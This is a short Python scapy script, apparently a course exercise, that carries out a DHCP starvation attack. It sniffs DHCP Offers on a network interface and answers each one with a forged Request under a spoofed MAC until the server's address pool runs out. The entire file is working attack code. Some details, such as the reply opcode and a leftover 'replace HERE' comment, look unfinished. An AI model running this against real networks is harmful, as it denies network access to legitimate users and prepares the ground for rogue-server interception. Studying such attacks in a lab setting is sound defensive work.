#!/usr/bin/python3

from  scapy.all import *
from random import randint

dev = "eth0" # change if needed

# add a udp port filter for sniffing according to the port you expect to get DHCP packets from
filter = "udp port 67 or udp port 68"

orig_mac = None

def handle_packet(packet):
    eth = packet.getlayer(Ether)
    ip = packet.getlayer(IP)
    udp = packet.getlayer(UDP)
    bootp = packet.getlayer(BOOTP)
    dhcp = packet.getlayer(DHCP)
    dhcp_message_type = None
    
    gi_addr = bootp.giaddr
    si_addr = bootp.siaddr
    global orig_mac

    if not dhcp:
        return

    for opt in dhcp.options:
        if opt[0] == "message-type":
            dhcp_message_type = opt[1]

        # the relevant type for discover message is
        # 1 for the DHCP Discover message and 2 for the DHCP Offer message. 
        # These values represent the type of DHCP message, as defined in the DHCP protocol.
        if dhcp_message_type == 1:
            print ("got dhcp discover (spoofed mac:", eth.src, ")")
            orig_mac = str(eth.src)
            return
        
        if dhcp_message_type == 2:
            for x in dhcp.options:
                if x[0] == "server_id":
                    ip_server = x[1]
                    # print ("ip of server:" , str(ip_server))

            # keep the suggested ip that you got from the OFFER,
            # it is located in bootp header
            sugg_ip = bootp.yiaddr #pckt is the sniffed packet
            print ("got dhcp offer with suggested ip: " + sugg_ip + ". spoofing accordingly...")
            c_mac = str(bootp.chaddr)
            s_mac = str(eth.src)

            client_ip = bootp.yiaddr
            header_eth = Ether(src=orig_mac, dst=eth.dst)
            header_ip = IP(src=sugg_ip, dst=ip_server)
            header_udp = UDP(sport=udp.dport, dport=udp.sport)
            header_bootp = BOOTP(op=2, chaddr=c_mac, siaddr=gi_addr, yiaddr="0.0.0.0", xid=bootp.xid)

            # replace the word "HERE" with the number of REQUEST message type
            header_dhcp  = DHCP(options=[("message-type", 3), \
                        ("client_id", c_mac),                \
                        ("requested_addr", sugg_ip),         \
                        ("subnet_mask", "255.255.255.0"),    \
                        ("server_id", ip_server),            \
                        ("end")])

            dhcp_req = header_eth / header_ip / header_udp / header_bootp / header_dhcp

            #dhcp_req.show() # Uncomment for debug. Comment before execution
            sendp(dhcp_req, iface=dev)
            return


# START
print ("Sniffing DHCP offers on " + dev + ", and sending requests for Starvation...")
sniff(iface=dev, filter=filter, prn=handle_packet)

